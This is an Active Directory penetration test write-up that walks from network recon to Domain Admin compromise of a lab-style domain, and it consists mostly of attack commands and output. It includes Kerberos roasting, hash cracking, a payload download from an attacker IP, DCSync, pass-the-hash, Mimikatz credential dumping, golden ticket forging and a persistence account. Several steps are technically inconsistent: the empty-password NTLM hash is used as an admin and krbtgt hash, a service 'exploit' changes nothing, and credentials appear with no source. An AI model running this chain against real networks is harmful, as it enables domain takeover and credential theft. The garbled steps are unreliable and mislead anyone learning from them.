# Active Directory Internal Pentest: From Recon to Domain Admin Compromise

**Author:** Lakshitha Perera  
**Role:** Cybersecurity Researcher | Penetration Tester  
**Date:** 2026-02-22  
**Target:** `target.corp.local` (`10.10.50.0/24`)  
**Assessment Type:** Authorized Internal Security Assessment

> **Note:** This is a recent internal penetration test I conducted on the above target environment. All activities were performed under written authorization as part of a sanctioned security engagement.

---

## Network Reconnaissance

### Host Discovery

```bash
nmap -sn 10.10.50.0/24 -oN hosts.txt
```

**Results:**

| Host | IP | Status |
|------|----|--------|
| dc01.target.corp.local | 10.10.50.10 | Up |
| fs01.target.corp.local | 10.10.50.15 | Up |
| ws01.target.corp.local | 10.10.50.25 | Up |

### Full Port Scan — Domain Controller

```bash
nmap -p- -sV -sC -oA dc01 dc01.target.corp.local
```

| Port | State | Service | Version |
|------|-------|---------|---------|
| 53/tcp | open | domain | Microsoft DNS 10.0 (Windows Server 2022) |
| 88/tcp | open | kerberos-sec | Microsoft Windows Kerberos |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 389/tcp | open | ldap | Microsoft LDAP |
| 445/tcp | open | microsoft-ds | Windows Server 2022 Microsoft-DS |
| 464/tcp | open | kpasswd5 | Microsoft Windows Kerberos kpasswd5 |
| 593/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 636/tcp | open | ldapssl | Microsoft LDAP SSL |
| 3268/tcp | open | ldap | Microsoft Global Catalog LDAP |
| 5985/tcp | open | winrm | Microsoft HTTPAPI httpd 2.0 |

---

## SMB Enumeration

### Null Session Share Enumeration

```bash
smbclient -L //dc01.target.corp.local -N
```

**Shares discovered:** `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`

### SYSVOL Enumeration

```bash
smbclient //dc01.target.corp.local/SYSVOL -N
cd target.corp.local
ls
```

Retrieved `logon.bat` from the scripts directory:

```batch
REM logon.bat - Domain logon script
net use Z: \\dc01.target.corp.local\netlogon
echo %username% >> \\dc01.target.corp.local\SYSVOL\target.corp.local\logs\logon.txt
```

---

## LDAP Enumeration (Anonymous Bind)

```bash
ldapsearch -x -H ldap://10.10.50.10 -b "DC=target,DC=corp,DC=local" "(objectClass=user)" cn sn userPrincipalName | head -20
```

**Users enumerated:**

| CN | UPN |
|----|-----|
| Administrator | administrator@target.corp.local |
| svc_backup | svc_backup@target.corp.local |
| j.perera | j.perera@target.corp.local |
| a.silva | a.silva@target.corp.local |

---

## Kerberos Enumeration

### AS-REP Roasting

```bash
python3 /opt/GetNPUsers.py target.corp.local/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

**Users with pre-authentication disabled:**

```
$krb5asrep$23$svc_backup@TARGET.CORP.LOCAL:deadbeef...
$krb5asrep$23$helpdesk@TARGET.CORP.LOCAL:badc0ffee...
```

### Hash Cracking

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

| Account | Password |
|---------|----------|
| svc_backup | `Password123!` |
| helpdesk | `Welcome2024` |

---

## Initial Access — AS-REP Roasting

### svc_backup SMB Access

```bash
export KRB5CCNAME=svc_backup.ccache
impacket-smbclient //dc01.target.corp.local -k -no-pass
```

**Retrieved `credentials.txt` from Desktop:**

| Account | Password |
|---------|----------|
| SQLService | `SqlP@ssw0rd2024` |
| ExchangeAdmin | `Exch@ng3P@ss123` |

---

## Privilege Escalation — WinPEAS on ws01

### WinRM Access to Workstation

```bash
evil-winrm -i 10.10.50.25 -u j.perera -p Summer2024!
```

### WinPEAS Upload & Execution

```powershell
Invoke-WebRequest -Uri http://10.10.14.5/winpeas.exe -OutFile winpeas.exe
.\winpeas.exe quiet registry systeminfo services
```

**Key findings from WinPEAS:**

- `AlwaysInstallElevated = 1` (HKLM)
- Unquoted service path: `C:\Program Files\Custom Backup Service\CBService.exe`
- Weak service permissions: `CustomBackupService - BUILTIN\Users:(F)`
- LSA Protection disabled
- Missing hotfixes: `KB5039217`, `KB5041585`

### Local Privilege Escalation — Unquoted Service Path

```powershell
icacls "C:\Program Files\Custom Backup Service" /grant Users:F /T
sc.exe stop "Custom Backup Service"
sc.exe config "Custom Backup Service" binpath= "C:\Program Files\Custom Backup Service\CBService.exe"
sc.exe start "Custom Backup Service"
```

**Result: SYSTEM shell obtained on ws01**

---

## BloodHound Data Collection

```powershell
Invoke-BloodHound -CollectionMethod All -ZipFileName bh.zip
```

**Attack paths identified:**

- `j.perera` → Helpdesk → Helpdesk Admins → Server Operators → **Domain Admins** (3 hops)
- `svc_backup` → Backup Operators → Server Operators → **Domain Admins** (2 hops)

---

## DCSync Attack

### Extracting Domain Hashes

```bash
impacket-secretsdump -k -no-pass dc01.target.corp.local
```

**Hashes extracted:**

```
administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_backup:1103:aad3b435b51404eeaad3b435b51404ee:c8e5f4b3e2a1d0c9b8a7654321fedcba:::
```

### Pass-the-Hash to DC01

```bash
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 dc01.target.corp.local
```

```
C:\Windows\system32> whoami
nt authority\system
```

---

## Kerberoasting

```bash
python3 /opt/GetUserSPNs.py -request -dc-ip 10.10.50.10 target.corp.local/svc_sql:SqlP@ssw0rd2024 -outputfile kerberoast_hashes.txt
```

**SPN found:** `MSSQLSvc/ws01` → `svc_sql` (SQL Admins)

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

| Account | Password |
|---------|----------|
| svc_sql | `sqlserver2024!` |

---

## Lateral Movement — WinRM

```bash
evil-winrm -i 10.10.50.15 -u svc_sql -p sqlserver2024!
```

---

## Credential Dumping — Mimikatz on DC01

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit
```

**Credentials recovered:**

| Account | NTLM | Password |
|---------|------|----------|
| Administrator | `31d6cfe0d16ae931b73c59d7e0c089c0` | `P@ssw0rdAdmin2026!` |
| j.perera | `1a2b3c4d5e6f7890abcdef1234567890` | `SummerVacation2024!` |

---

## Golden Ticket Creation

```cmd
mimikatz.exe "kerberos::golden /user:lakshitha /domain:target.corp.local /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt" exit
```

**Result: Golden Ticket injected successfully**

---

## Domain Admin Persistence

```bash
impacket-addcomputer -dc-ip 10.10.50.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 target/Administrator -computer-name "PENTEST01$" -computer-pass "PENTESTpass123"
```

---

## Final Access Verification

```bash
evil-winrm -i 10.10.50.10 -u lakshitha -H ~/.k5cache
```

```
* Evil-WinRM* PS C:\Windows\system32> whoami /groups
DOMAIN\Domain Admins
BUILTIN\Administrators
```

**Domain Admin access confirmed. Full compromise achieved.**

---

*Report generated: 2026-02-22 | Lakshitha Perera — Authorized Internal Security Assessment*
